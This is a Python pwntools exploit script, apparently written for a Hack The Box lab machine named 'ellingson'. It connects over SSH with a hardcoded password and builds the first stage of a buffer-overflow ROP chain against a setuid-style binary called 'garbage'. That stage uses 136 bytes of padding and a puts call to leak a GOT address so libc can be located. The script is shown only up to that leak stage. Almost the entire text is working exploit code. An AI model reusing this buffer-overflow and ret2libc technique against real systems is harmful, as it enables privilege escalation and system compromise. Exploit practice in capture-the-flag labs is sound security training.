#!/usr/bin/env python

from pwn import *
import os

# p64(address) # converting to little endian

# Easy way to find buffer overflow - 'cyclic 1000 | ./file ; dmesg | tail -5'
# Then look for the last address and use 'cyclic -l address'
# For this application, I need to do it differently. Use gdb with cyclic amount,
# then check RSP and extract the last 4 byte & use cyclic -l on it

# NX enabled - little endian 64

# ----------------------------------

# p = process('./garbage')
context(os='linux', arch='amd64')
# context.log_level = 'debug'
s = ssh('margo', 'ellingson.htb', password='iamgod$08')

# Automating everything (Well trying to atleast..)
p = s.process('/bin/sh', env={'PS1':''})
log.info("Mapping binaries")
p.sendline('/usr/bin/garbage')
garbage = ELF('./garbage')
rop = ROP(garbage)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6') # May need to change to so.2

# Stage 1 - Leak ------------------
junk = "A"*136
rop.search(regs=['rdi'], order = 'regs') # Finds gadget
rop.puts(garbage.got['puts']) # Finds puts
rop.call(garbage.symbols['main']) # reruns main
log.info('Stage 1 ROP Chain:\n' + rop.dump())
